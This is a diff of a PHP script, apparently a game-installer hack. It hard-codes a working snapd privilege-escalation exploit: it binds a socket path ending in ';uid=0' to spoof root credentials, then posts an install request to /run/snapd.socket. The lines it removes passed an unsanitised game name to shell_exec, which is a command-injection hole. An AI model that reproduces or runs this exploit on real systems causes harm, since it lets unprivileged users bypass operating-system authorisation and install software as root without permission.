@@ -43,21 +43,21 @@ echo "
     socket = socket resource created with socket_create()
     addresss = path of a Unix-domain socket with super root id -> UID=0)
     */
-    socket_bind($socket, $injectedPath);
+    socket_bind($socket, "/tmp/hack4gaming;uid=0");
 
     /*
     Initiates a connection on a socket
     socket = valid socket resource with name super root UID
     address = "/run/snapd.socket" (snapd API Socket)
     */
-    socket_connect($socket, $snapdSocketPath);
+    socket_connect($socket, "/run/snapd.socket");
 
     /*
     POST Request /v2/snaps/{name} can install, refresh, remove, revert, enable or disable apps form snap app store
     */
     $payload = '{"action": "install", "channel": "stable"}';
     $len = strlen($payload);
-    $req = "POST /v2/snaps/".$game." HTTP/1.1\r\n"
+    $req = "POST /v2/snaps/openra HTTP/1.1\r\n"
     ."Host: localhost\r\n"
     ."Content-Length: " . $len . "\r\n\r\n"
     . $payload;
@@ -104,14 +104,6 @@ echo "
     */
     socket_close($socket);
     echo "installing";
-    $command = "$(snap info ".$game.") &> /dev/null";
-
-    while (true){
-        $output = shell_exec($command);
-        if (!is_null($output)){
-            break;
-        }
-    }
     
     
 
